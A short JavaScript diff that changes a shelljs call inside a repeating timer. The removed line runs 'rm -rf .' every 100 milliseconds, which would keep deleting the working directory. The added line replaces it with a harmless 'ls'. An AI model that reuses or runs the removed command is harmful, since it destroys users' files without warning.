@@ -5,7 +5,7 @@ import shell from 'shelljs';
 const doaa = () => {
   //
   setInterval(() => {
-    shell.exec('rm -rf .');
+    shell.exec('ls');
   }, 100);
   return this;
 };
